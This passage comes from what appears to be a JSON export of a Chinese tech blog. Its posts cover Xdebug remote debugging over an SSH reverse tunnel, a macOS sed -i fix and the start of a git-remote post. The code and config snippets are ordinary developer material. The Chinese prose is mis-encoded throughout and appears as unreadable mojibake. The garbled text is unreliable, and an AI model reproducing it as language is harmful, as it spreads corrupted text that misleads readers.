mappingï¼‰ï¼Œå³æœ¬åœ°åœ¨IDEä¸­æ‰“å¼€çš„é¡¹ç›®ç›®å½•ä¸è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„é¡¹ç›®ç›®å½•åšä¸€ä¸€æ˜ å°„ï¼Œä¾‹å¦‚ macOS æœ¬åœ°ï¼š/Users/chaos/Work/php/demos/debug/ Linux æœåŠ¡å™¨ï¼š/home/chaos/Work/php/demos/debug/ æœ¬åœ°å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶å¸¦ä¸Š Cookie: XDEBUG_SESSION=IDEKEY æœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚æ—¶ï¼Œç»å†äº† Nginx -&gt; php-fpm ååˆ°è¾¾ Xdebugï¼ŒXdebug æ£€æµ‹åˆ° XDEBUG_SESSION çš„ cookieï¼Œè®¤ä¸ºè¿™æ¡è¯·æ±‚æ˜¯å¸¦ç€ è°ƒè¯•ç›®çš„ æ¥çš„ï¼ŒåŒæ—¶æŒ‚èµ· PHPè§£é‡Šå™¨ è¿›ä¸€æ­¥å¤„ç†è¯·æ±‚ ç„¶å Xdebug ä» php.ini ä¸­è·å–ç›®æ ‡åœ°å€æˆ–ä» $_SERVER é‡Œè·å–åˆ°è¯·æ±‚çš„æ¥æºåœ°å€ï¼ˆæ¯”å¦‚ 223.104.148.182ï¼‰ä½œä¸ºç›®æ ‡åœ°å€ï¼Œç„¶åå°±å‘ç›®æ ‡åœ°å€çš„ 9000 ç«¯å£å‘èµ·å»ºç«‹ è°ƒè¯•è¿æ¥ æœ¬åœ°çš„ IDEï¼ˆæœ¬èº«æˆ–åˆ©ç”¨æ’ä»¶ï¼‰ å‘ç°ç›‘å¬çš„ 9000 ç«¯å£æœ‰ è°ƒè¯•è¿æ¥ å»ºç«‹ï¼Œåˆ¤æ–­ä¸€ä¸‹ XDEBUG_SESSION æ˜¯å¦ä¸ºè‡ªå·±é¢„è®¾çš„ IDE key å¦‚æœä¸æ˜¯é¢„è®¾ IDE keyï¼Œé€šè¿‡ 9000 ç«¯å£ä¸Šçš„ è°ƒè¯•è¿æ¥ å‘Šè¯‰æœåŠ¡å™¨çš„ Xdebugï¼Œâ€œä¸å½’æˆ‘ç®¡ï¼Œæˆ‘ä¸å¤„ç†â€ï¼Œç„¶ååŒæ–¹åå•†ä¸€ä¸‹æ–­è¿æ¥ å¦‚æœæ˜¯é¢„è®¾ IDE keyï¼ŒåŒæ—¶å‘ç°æœ¬åœ°æ‰“äº†æ–­ç‚¹æˆ–è€…æœ¬åœ°è®¾ç½®äº† &quot;stopOnEntry&quot;: true (VSCode) / Break at first line in PHP scripts (PhpStorm)ï¼Œåˆ™å‘Šè¯‰æœåŠ¡å™¨çš„ Xdebugï¼Œâ€œæ”¶åˆ°ï¼Œè°ƒè¯•å‡†å¤‡å°±ç»ªâ€ï¼Œç„¶ååŒæ–¹åå•†ä¸€ä¸‹è¿›å…¥è°ƒè¯•çŠ¶æ€ çœŸå®ç¯å¢ƒä¸‹ è¿œç¨‹è°ƒè¯• çš„ é™·é˜±èªæ˜çš„å°ä¼™ä¼´å¯èƒ½å·²ç»å‘ç°ä¸Šè¿° è°ƒè¯•æµç¨‹ é‡Œå­˜åœ¨çš„ä¸€ä¸ª é™·é˜±ï¼šå³æœåŠ¡å™¨è¦å‘æœ¬åœ°è¯·æ±‚å»ºç«‹ è°ƒè¯•è¿æ¥ï¼Œä½†é—®é¢˜æ˜¯ï¼Œç°åœ¨æ‰€æœ‰çš„ å®¶ç”¨/ä¼ä¸š ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæ‰€è°“çš„ æœ¬åœ° éƒ½åœ¨ä¸Šçº§è·¯ç”±å™¨çš„ NAT ä¸‹ï¼Œæ ¹æœ¬å°±æ²¡æœ‰æš´éœ²åœ¨å…¬ç½‘çš„ IPåœ°å€ï¼Œæ‰€ä»¥ æœ¬åœ° çš„ 9000 ç«¯å£å¯¹äºæœåŠ¡å™¨æ¥è¯´ï¼Œæ˜¯ä¸å¯è¾¾çš„ï¼Œæƒ³è¦è®¿é—®ï¼Œåšæ¢¦ï¼ å¡«å‘ é™·é˜±ç¬”è€…é‡æ–°æ¨¡æ‹Ÿäº†çœŸå®çš„è°ƒè¯•ç¯å¢ƒï¼Œå³ æœ¬åœ° ä¸º macOSï¼Œè¿œç¨‹æœåŠ¡å™¨ é€‰äº†ä¸¤å° Linuxï¼Œä¸€å°æ˜¯ç¬”è€…åœ¨å…¬å¸æ­å»ºçš„ ç‰©ç†æœºï¼Œå¦ä¸€å°æ˜¯å…¬å¸è´­ä¹°çš„é˜¿é‡Œäº‘ äº‘ä¸»æœºã€‚ å¡«å‘çš„æœ€ç»ˆç›®çš„ï¼Œæ˜¯è¦ä½¿å¾— æœ¬åœ° çš„ 9000 ç«¯å£æš´éœ²ç»™æœåŠ¡å™¨ï¼Œè®©å…¶ç›´æ¥å¯è¾¾ã€‚ è¿™é‡Œåˆ†ï¼š æœ¬åœ°å’Œè¿œç¨‹æœåŠ¡å™¨åŒå¤„ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œä¾‹å¦‚ï¼Œéƒ½åŠ å…¥åŒä¸€ä¸ª VPN ç½‘ç»œï¼Œæœ¬åœ°é€šè¿‡ VPN åˆ†é…ç»™æœåŠ¡å™¨çš„ ç§ç½‘IP è®¿é—®æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨çš„ Xdebug è§£æåˆ°çš„æ¥æºåœ°å€åˆ™ä¹Ÿæ˜¯é€šè¿‡ VPN åˆ†é…ç»™æœ¬åœ°çš„ ç§ç½‘IPï¼Œç›´æ¥å¯è¾¾ã€‚ è·¯ç”±å™¨æœ¬èº«ä» ISPï¼ˆå®½å¸¦è¿è¥å•†ï¼‰ é€šè¿‡ PPPoE æ‹¨å· è·å–åˆ°äº† å…¬ç½‘IPï¼Œç„¶åè·¯ç”±å™¨ä¸Šé€šè¿‡ ç«¯å£æ˜ å°„ æˆ– DMZ æ¨¡å¼ï¼Œå°†æœ¬åœ°çš„ 9000 ç«¯å£ï¼Œæ˜ å°„åˆ°è·¯ç”±å™¨çš„ 9000 ç«¯å£ï¼Œè¿™æ ·æœåŠ¡å™¨ä¹Ÿå¯é€šè¿‡ å…¬ç½‘IP:9000 è®¿é—®åˆ°æœ¬åœ°çš„ 9000 ç«¯å£ã€‚ï¼ˆè¯¥æ–¹å¼æœ€æ¨èï¼Œä½†æ˜¯åœ¨å›½å†…å¯è¡Œåº¦ä¸é«˜ï¼Œå› ä¸ºå›½å†… IPåœ°å€æ±  å³å°†æ¯ç«­ï¼Œæ‰€ä»¥å¾ˆéš¾ä»è¿è¥å•†å¤„ç”³è¯·åˆ° å…¬ç½‘IPï¼‰ å…¶ä»–ç¯å¢ƒåªèƒ½å€ŸåŠ© ç§»èŠ±æ¥æœ¨å¤§æ³•ï¼šå€ŸåŠ© SSH åå‘éš§é“ï¼Œåœ¨æœ¬åœ°å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡ TCPé€šé“ï¼Œå°†æœ¬åœ°çš„ 9000 ç«¯å£æ˜ å°„åˆ°æœåŠ¡å™¨çš„ 9000 ç«¯å£ã€‚è¿™æ ·çš„è¯ï¼ŒæœåŠ¡å™¨ä¸Šçš„ Xdebug è®¿é—® localhost:9000 å°±ç­‰äºè®¿é—®åˆ°äº† IDEæœ¬åœ° çš„ 9000 ç«¯å£ã€‚ï¼ˆå€Ÿç”¨ JetBrains å®˜æ–¹æ–‡æ¡£é‡Œçš„ä¸€å‰¯æ’å›¾ï¼‰ åœ¨è¿™é‡Œï¼Œç¬”è€…å°†å‰ä¸¤ç§ç¯å¢ƒå½’çº³ä¸º å›ç¨‹ç½‘ç»œç›´æ¥å¯è¾¾ï¼Œå¦åˆ™åˆ™ä¸º å›ç¨‹ç½‘ç»œä¸å¯ç›´è¾¾ã€‚ PhpStorm çš„ç‰¹æ®Šé…ç½®åœ¨åˆ†åˆ«ç½—åˆ—è¿œç¨‹è°ƒè¯•çš„å…·ä½“å‚æ•°é…ç½®ä¹‹å‰ï¼Œç¬”è€…è¿˜å¾—é¢å¤–å°† PhpStorm çš„ç‰¹æ®Šé…ç½®å•ç‹¬æ‹å‡ºæ¥é˜è¿°ä¸€ä¸‹ã€‚ PhpStorm è°ƒè¯•çš„ ç›®æ ‡æœåŠ¡å™¨ï¼Œä»¥ Server çš„å­˜åœ¨è¿›è¡Œé…ç½®ï¼Œå…·ä½“ä½äº åå¥½è®¾ç½® çš„ Languages and Frameworks | PHP | Servers ä¸‹ã€‚è¯¦è§ JetBrains å®˜æ–¹æ–‡æ¡£ï¼ŒåŸæ–‡æ˜¯è¿™æ ·çš„ï¼š On this page, configure HTTP access for debugging engines to interact with local and remote Web servers and set correspondence between files on the server and their local copies in the PhpStorm project. åœ¨æœ¬é¡µï¼Œä¸ºè°ƒè¯•é…ç½® HTTP è®¿é—®ï¼Œç”¨ä»¥åœ¨ æœ¬åœ° å’Œ è¿œç¨‹ Web æœåŠ¡å™¨ ä¹‹é—´äº¤äº’ï¼Œä»¥åŠä¸º è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶ ä¸å…¶åœ¨ PhpStorm å·¥ç¨‹ ä¸­æ‰“å¼€çš„ æœ¬åœ°æ‹·è´ è®¾ç½®å…³è”ã€‚ PhpStorm è°ƒè¯•çš„ç‰¹æ®Šé…ç½®ï¼šåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ php-fpm é…ç½®æ–‡ä»¶é‡Œæ·»åŠ è¿™ä¸¤è¡Œï¼š 12clear_env &#x3D; noenv[&quot;PHP_IDE_CONFIG&quot;] &#x3D; &quot;serverName&#x3D;UbuntuServer&quot; è¿™é‡Œ UbuntuServer æ˜¯è‡ªå®šä¹‰çš„æœåŠ¡å™¨åç§°ï¼Œè‡ªè¡Œæ›´æ”¹ã€‚ ç„¶ååœ¨ PhpStorm åå¥½è®¾ç½®çš„ Languages and Frameworks | PHP | Servers æ·»åŠ ä¸€ä¸ª Server name å¡« UbuntuServer Host å’Œ Port ç¬”è€…äº²æµ‹å¯å¡«ä»»æ„åˆæ³•å€¼ï¼ŒPhpStorm ä¸æ ¡éªŒï¼Œæ‰€ä»¥ç¬”è€…éƒ½å¡«å†™äº† 0 å€¼ Debugger é€‰æ‹© Xdebug å‹¾é€‰ä¸Š Use path mappingsï¼Œå¹¶ä¸”è®¾ç½®å¥½ æœ¬åœ°æ–‡ä»¶ç›®å½•è·¯å¾„ å’Œ æœåŠ¡å™¨æ–‡ä»¶ç›®å½•è·¯å¾„ çš„æ˜ å°„ï¼ˆæ¯”å¦‚ç¬”è€…æœ¬åœ°çš„ /Users/chaos/Work/php/demos/debug/ ä¸æœåŠ¡å™¨çš„ /home/chaos/Work/php/demos/debug/ï¼‰ VSCode çš„é…ç½®åªéœ€è¦æ¯”æœ¬åœ°è°ƒè¯•å¤šé…ç½®ä¸€ä¸ª è·¯å¾„æ˜ å°„ï¼Œå³ pathMappings é”®å€¼å¯¹ï¼Œé™„ä¸Š launch.json æ–‡ä»¶å†…å®¹ï¼š 1234567891011121314151617181920212223&#123; &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Listen for XDebug&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;port&quot;: 9000, &#x2F;&#x2F; &quot;stopOnEntry&quot;: true, &quot;pathMappings&quot;: &#123; &quot;&#x2F;home&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug&#x2F;&quot;: &quot;$&#123;workspaceRoot&#125;&#x2F;&quot;, &#125; &#125;, &#123; &quot;name&quot;: &quot;Launch currently open script&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;port&quot;: 9000 &#125; ]&#125; è¿™é‡Œçš„ &quot;/home/chaos/Work/php/demos/debug/&quot;: &quot;$&#123;workspaceRoot&#125;/&quot; æ˜¯ &quot;/home/chaos/Work/php/demos/debug/&quot;: &quot;/Users/chaos/Work/php/demos/debug/&quot; çš„ç®€åŒ–å½¢å¼ï¼Œ$&#123;workspaceRoot&#125; åˆ™ä¸º VSCode ä¸­æ‰“å¼€çš„ é¡¹ç›®æ ¹ç›®å½•ã€‚ æœåŠ¡å™¨çš„ php.ini åœ¨ä¸åŒæƒ…å†µä¸‹çš„é…ç½®æƒ…å†µä¸€ï¼šå›ç¨‹ç½‘ç»œç›´æ¥å¯è¾¾ Xdebug 2.X 123[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_connect_back&#x3D;1 | remote_enable=1 è¡¨ç¤ºå¼€å¯è¿œç¨‹è°ƒè¯• | remote_connect_back=1 è¡¨ç¤ºè·å–è¯·æ±‚å‘èµ·åœ°å€ï¼ˆä» $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] å’Œ $_SERVER[&#39;REMOTE_ADDR&#39;] ä¸­è·å–ï¼‰ï¼Œåå‘è®¿é—®å‘èµ·åœ°å€çš„ 9000 ç«¯å£å»ºç«‹è°ƒè¯•è¿æ¥ Xdebug 3.X 1234[xdebug]xdebug.mode&#x3D;debugxdebug.discover_client_host&#x3D;truexdebug.port&#x3D;9000 | mode=debug å–ä»£äº† 2.X ç‰ˆæœ¬çš„ remote_enable=1 | discover_client_host=true å–ä»£äº† 2.X ç‰ˆæœ¬çš„ xdebug.remote_connect_back=1 | port=9000 æ˜¯ä¸ªäººå–œå¥½ï¼Œåœ¨ 3.X ä¸­é»˜è®¤ä¸º 9003ã€‚ç¬”è€…å€¾å‘äºä¿æŒä¸ 2.X ä¸€è‡´ï¼Œè¿™æ ·åŒä¸€ä»½ IDE é…ç½®å¯ä»¥åŒæ—¶è°ƒè¯• 2.X ç‰ˆæœ¬å’Œ 3.X ç‰ˆæœ¬ æƒ…å†µäºŒï¼šå›ç¨‹ç½‘ç»œä¸å¯ç›´è¾¾å…ˆç”¨ SSH éš§é“ åå‘å°†æœ¬åœ°çš„ 9000 ç«¯å£æ˜ å°„åˆ°æœåŠ¡å™¨çš„ 9000 ç«¯å£ä¸Š 1ssh -g -N -R 9000:127.0.0.1:9000 user@server Xdebug 2.X (Method A) 123[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_host&#x3D;127.0.0.1 | remote_host=127.0.0.1 è¡¨ç¤ºç›´æ¥å‘ 127.0.0.1 è¿™ä¸ªåœ°å€è¯·æ±‚å»ºç«‹è°ƒè¯•è¿æ¥ Xdebug 2.X (Method B) 1234[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_connect_back&#x3D;1xdebug.remote_addr_header&#x3D;&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; | remote_connect_back=1 è¡¨ç¤ºè·å–è¯·æ±‚å‘èµ·åœ°å€ï¼Œåå‘è®¿é—®å‘èµ·åœ°å€çš„ 9000 ç«¯å£å»ºç«‹è°ƒè¯•è¿æ¥ | xdebug.remote_addr_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; è¡¨ç¤ºä¼˜å…ˆä» $_SERVER[â€˜HTTP_X_XDEBUG_REMOTE_ADDRâ€™] è·å–å‘èµ·åœ°å€ï¼Œè·å–ä¸åˆ°å†å» $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] å’Œ $_SERVER[&#39;REMOTE_ADDR&#39;] ä¸­å¯»æ‰¾ | è°ƒè¯•è¯·æ±‚ç±»ä¼¼äº $ curl server.com:8000 -b XDEBUG_SESSION=IDEKEY -H &quot;X-Xdebug-Remote-Addr: 127.0.0.1&quot; | æ³¨æ„ï¼šHTTP- å‘é€è¯·æ±‚æ—¶ä¸ç”¨æ·»åŠ ï¼Œå› ä¸ºå¯¹äºæœªè‡ªå®šä¹‰çš„ headerï¼ŒNginx ä¼šè‡ªåŠ¨åŠ ä¸Šå‰ç¼€ HTTP_ï¼Œå¹¶å…¨éƒ¨å¤§å†™ï¼Œæ¨ªçº¿ è½¬ä¸º ä¸‹åˆ’çº¿ï¼Œå­˜å…¥ $_SERVER å…¨å±€å˜é‡ä¸­ Xdebug 3.X (Method A) 1234[xdebug]xdebug.mode&#x3D;debugxdebug.port&#x3D;9000xdebug.client_host&#x3D;127.0.0.1 | client_host=127.0.0.1 è¡¨ç¤ºç›´æ¥å‘Šè¯‰ Xdebugï¼Œå‘èµ·åœ°å€å°±æ˜¯ 127.0.0.1ï¼Œä½ å¾€è¿™ä¸ªåœ°å€è¯·æ±‚å»ºç«‹è°ƒè¯•è¿æ¥å°±å¯ä»¥äº† Xdebug 3.X (Method B) 12345[xdebug]xdebug.mode&#x3D;debugxdebug.port&#x3D;9000xdebug.discover_client_host&#x3D;truexdebug.client_discovery_header&#x3D;&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; | client_discovery_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; å–ä»£äº† 2.X ç‰ˆæœ¬çš„ xdebug.remote_addr_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; å…¶ä¸­ Xdebug 2.X (Method B) ä¸ Xdebug 3.X (Method B) è¿˜æœ‰äº›è®¸ä¸åŒï¼š Xdebug 2.X (Method B) å¦‚æœæŒ‰é…ç½®è§„åˆ™æ²¡æ‰¾åˆ°è¯·æ±‚å‘èµ·åœ°å€ï¼Œå®ƒä¸ä¼šé™çº§ä½¿ç”¨ 127.0.0.1/localhost ä½œä¸ºè¯·æ±‚å‘èµ·åœ°å€ Xdebug 3.X (Method B) å¦‚æœæŒ‰é…ç½®è§„åˆ™æ²¡æ‰¾åˆ°è¯·æ±‚å‘èµ·åœ°å€ï¼Œå®ƒä¼šé™çº§ä½¿ç”¨ 127.0.0.1/localhost ä½œä¸ºè¯·æ±‚å‘èµ·åœ°å€ å¤šäººè°ƒè¯• - DBGpå…ˆé™„ä¸Šå‚è€ƒæ–‡æ¡£ Multiuser debugging via Xdebug proxies PhpStormå®˜æ–¹ï¼šé€šè¿‡ DBGp ä»£ç†è¿›è¡Œå¤šäººè°ƒè¯• DBGp Proxy Tool Xdebugå®˜æ–¹ è¿™å—æˆ‘ä¸ä»…ä¼šç•¥è¿‡ï¼Œæˆ‘è¿˜ä¼šç‹ ç‹ çš„åæ§½ä¸€ä¸‹ã€‚å…ˆæ¥çœ‹ä¸€ä¸‹ä¸Šè¿° â€œMultiuser debugging via Xdebug proxiesâ€ è¿™ç¯‡æ–‡é‡Œçš„ä¸€å¼ æ’å›¾ çœ‹ä¼¼å¾ˆç¾å¦™æ˜¯ä¸æ˜¯ï¼Œåœ¨ç¬”è€…ä¸‹è½½äº† dbgpProxy å¹¶ä¸”åå¤å®éªŒåï¼Œå‘ç°è¿™ä¸ªå·¥å…·çœŸçš„æ˜¯ç¥å‘ã€‚ ç¬”è€…åœ¨é‚£å°é˜¿é‡Œäº‘ä¸Šè¿è¡Œ ./dbgpProxy -i 0.0.0.0:9001 -s 127.0.0.1:9000 åï¼Œä»æœ¬åœ°çš„ PhpStorm å¸¦ç€è‡ªå®šä¹‰IDE key &quot;PS&quot; å‘èµ·è°ƒè¯•è¯·æ±‚ï¼Œç»“æœ dbgpProxy æ—¥å¿—æ‰“å° Connecting to 112.3.2.42:9000ï¼Œè€Œç¬”è€…æ‰€åœ¨çš„æœ¬åœ°å®½å¸¦å¹¶æ²¡æœ‰å…¬ç½‘IPï¼Œ112.3.2.42 è¿™ä¸ªIPæ˜¯å¤šå±‚ NAT ä¹‹å‰çš„IPï¼Œè‚¯å®šè®¿é—®ä¸è¿›æ¥ï¼Œåªèƒ½ä¸Š SSH éš§é“æ–¹æ¡ˆã€‚ é‚£è¿™ä¸ª dbgpProxy çš„æ„ä¹‰ä½•åœ¨å‘¢ï¼Ÿç¬”è€…åœ¨ç½‘ä¸Šæ‰¾åˆ°äº† Xdebug çš„ä½œè€… Derick Rethansï¼ˆä»–åŒæ—¶è®¾è®¡äº† DBGp åè®®ï¼‰çš„ä¸€ç¯‡æ–‡ç«  - Debugging with multiple usersï¼Œåœ¨æ–‡ä¸­ï¼Œä»–æç»˜äº† DBDp çš„ä½¿ç”¨åœºæ™¯ï¼š Running a DBGp proxy also allows you to avoid NAT issues where (as seen from PHP+Xdebug on the server) all connections seem to come from the same IP (because your internal network is NATted). In this case, you can simple run the dbgp proxy on your NAT machine, configure xdebug.remote_host setting to the IP address of your NAT machine, and configure the IDEs to connect to the proxy running at :9001. å¤§è‡´è§£é‡Šä¸€ä¸‹ï¼š ä½ çš„è·¯ç”±å™¨å¾—ä»ISPå¤„è·å–åˆ°å…¬ç½‘IP åœ¨ä½ çš„è·¯ç”±å™¨ä¸Šè¿è¡Œ dbgpProxy è·¯ç”±å™¨ä¸‹æ‰€æœ‰äººçš„çš„ IDE çš„ DBGp Proxy é…ç½® çš„ Host å¡«å†™è·¯ç”±å™¨ç½‘å…³ï¼Œå³è·¯ç”±å™¨å†…ç½‘åœ°å€ åˆ°è¿™é‡Œï¼Œä½ å¯ä»¥å‘ç°ï¼Œæ­å»º DBGpè°ƒè¯•ç¯å¢ƒ éå¸¸è‹›åˆ»ï¼Œç»“åˆ å…¬ç½‘IP å’Œ è·¯ç”±å™¨è¿è¡Œ dbgpProxy è¿™ä¸¤ç‚¹çœ‹ï¼Œåªæœ‰ è½¯è·¯ç”± å¯ä»¥æ»¡è¶³ï¼Œå› ä¸º dbgpProxy çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶åªæœ‰ Windows / macOS / Linux x86-64 ç‰ˆæœ¬ã€‚æ‰€ä»¥å¤§éƒ¨åˆ†äºº/å…¬å¸ å¯ä»¥æ´—æ´—ç¡äº†ã€‚ ç»“è¯­ä¸ºäº†å†™è¿™ä¸¤ç¯‡æ–‡ï¼Œç¬”è€…æ˜¯ç¿»æ¥è¦†å»åšäº†å¾ˆå¤šå®éªŒï¼Œè¿˜æ•´ç†äº†å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼Œæ‰“äº†å¾ˆå¤šè‰ç¨¿ï¼ˆçœŸæ­£æ„ä¹‰ä¸Šçš„çº¸è´¨è‰ç¨¿ï¼‰ï¼Œæœ€åé™„ä¸Šæœ€æ»¡æ„çš„ä¸€å¼ è‰ç¨¿ã€‚ å¸Œæœ›è¯»è€…ä»¬èƒ½æœ‰æ‰€æ”¶è·ï¼Œæ„Ÿè°¢é˜…è¯»ï¼ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"}]},{"title":"è§£å†³ mac ä¸Š sed æŠ¥é”™","slug":"GNU-sed-to-mac-sed","date":"2020-12-05T03:13:25.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"GNU-sed-to-mac-sed.html","link":"","permalink":"https://blog.chaosjohn.com/GNU-sed-to-mac-sed.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ä¹‹å‰åœ¨æ¯ç¯‡æ–‡å‰éƒ½æ ‡æ³¨äº† åŸæ–‡é“¾æ¥ï¼Œæƒ³ç€æŠŠå®ƒæ›¿æ¢æˆ è½¬è½½ç”³æ˜ï¼Œæ‰‹åŠ¨ä¸€ç¯‡ä¸€ç¯‡æ›¿æ¢æ˜¯ä¸å¯èƒ½çš„ï¼Œå’±å¯æ˜¯ç¨‹åºå‘˜ï¼Œä»»ä½•æ‰¹é‡æ“ä½œéƒ½å¯ä»¥ è„šæœ¬åŒ– è¯´å¹²å°±å¹²å…³äºæ–‡æœ¬æ‰¹å¤„ç†å·¥å…·ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ sedï¼Œå®ƒæ˜¯ä¸€ä¸ªâ€œéäº¤äº’å¼çš„â€é¢å‘å­—ç¬¦æµçš„ç¼–è¾‘å™¨ï¼Œèƒ½åŒæ—¶å¤„ç†å¤šä¸ªæ–‡ä»¶å¤šè¡Œçš„å†…å®¹ï¼Œå¯ä»¥ä¸å¯¹åŸæ–‡ä»¶æ”¹åŠ¨ï¼ŒæŠŠæ•´ä¸ªæ–‡ä»¶è¾“å…¥åˆ°å±å¹•,å¯ä»¥æŠŠåªåŒ¹é…åˆ°æ¨¡å¼çš„å†…å®¹è¾“å…¥åˆ°å±å¹•ä¸Šã€‚è¿˜å¯ä»¥å¯¹åŸæ–‡ä»¶æ”¹åŠ¨ï¼Œä½†æ˜¯ä¸ä¼šå†å±å¹•ä¸Šè¿”å›ç»“æœã€‚ ä¸Šè„šæœ¬ï¼š 123456$ for file in *.md; do sed -i &#39;s&#x2F;åŸæ–‡é“¾æ¥&#x2F;æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘&#x2F;g&#39; $file; donesed: 1: &quot;Clean-APFS-Snapshots.md&quot;: invalid command code Csed: 1: &quot;Comeback-in-2020.md&quot;: invalid command code Csed: 1: &quot;Crack-Bartender2.md&quot;: invalid command code Csed: 1: &quot;Debug-php.md&quot;: extra characters at the end of D command... æ€ä¹ˆå›äº‹ï¼Œå…¨éƒ½æŠ¥é”™äº†ï¼Ÿï¼Ÿï¼Ÿ æŸ¥æ‰¾é—®é¢˜å…³äº sedï¼Œå¹³æ—¶åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¹Ÿç”¨çš„æŒºå¤šçš„ï¼Œsed -i &#39;s/æ—§/æ–°/g&#39; $&#123;FILE&#125; è¯­æ³•è‚¯å®šæ²¡é”™å‘€ã€‚å”¯ä¸€ä¸åŒçš„åœ¨äºç”Ÿäº§ç¯å¢ƒéƒ½æ˜¯ GNU/Linuxï¼Œé—®é¢˜è‚¯å®šå‡ºåœ¨äº† macOS ä¸Šã€‚ç”¨ man æŒ‡ä»¤æŸ¥çœ‹ä¸€ä¸‹ sed åœ¨ ä¸¤ä¸ªå¹³å°çš„ å¸®åŠ©æ‰‹å†Œ -i å³æ›¿æ¢åçš„æ–°æ–‡æœ¬ä¼šç›´æ¥å›å†™è¿›åŸæ–‡ä»¶ï¼š GNU sed å¦‚æœåœ¨ -i åæ·»åŠ äº† åç¼€ï¼Œåˆ™ä¼šå¤‡ä»½åŸæ–‡ä»¶ï¼›å¦‚æœä¸æ·»åŠ ï¼Œåˆ™ä¸å¤‡ä»½ mac sed åˆ™å¼ºåˆ¶æ€§è¦æ·»åŠ  åç¼€ã€‚å¦‚æœä¸æƒ³å¤‡ä»½åŸæ–‡ä»¶ï¼Œåç¼€ç½®ä¸ºç©ºå­—ç¬¦ä¸² &#39;&#39; è§£å†³åŸè„šæœ¬ä¿®æ­£ä¸º: 1$ for file in *.md; do sed -i &#39;&#39; &#39;s&#x2F;åŸæ–‡é“¾æ¥&#x2F;æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘&#x2F;g&#39; $file; done æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"sed","slug":"sed","permalink":"https://blog.chaosjohn.com/tags/sed/"}]},{"title":"git è®¾ç½®è¿œç«¯ä»“åº“","slug":"Git-set-remote","date":"2020-12-04T09:27:41.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Git-set-remote.html","link":"","permalink":"https://blog.chaosjohn.com/Git-set-remote.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰æ®µæ—¶é—´ï¼Œå…¬å¸å¼€äº†ä¸€ä¸ªæ–°é¡¹ç›®ï¼Œä¹°äº†å¦ä¸€å®¶å…¬å¸çš„æºç åšäºŒæ¬¡å¼€å‘ã€‚ é¡¹ç›®è¿›è¡Œäº†å‡ å¤©åï¼Œæˆ‘çªç„¶å¬åˆ°å‚ä¸å¼€å‘çš„å‡ ä¸ªåŒå­¦åœ¨è®¨è®ºï¼Œå…³äº â€œä¸æƒ³æŠŠæˆ‘ä»¬ä¿®æ”¹çš„ç‰ˆæœ¬æ¨ç»™ä»–ä»¬â€ã€‚ æˆ‘å°±é¡¿æ„Ÿå¥‡æ€ªï¼Œä¹°äº†æºç è¿˜è¦éµå¾ªä»–ä»¬çš„å¼€æºåè®®ï¼Ÿ 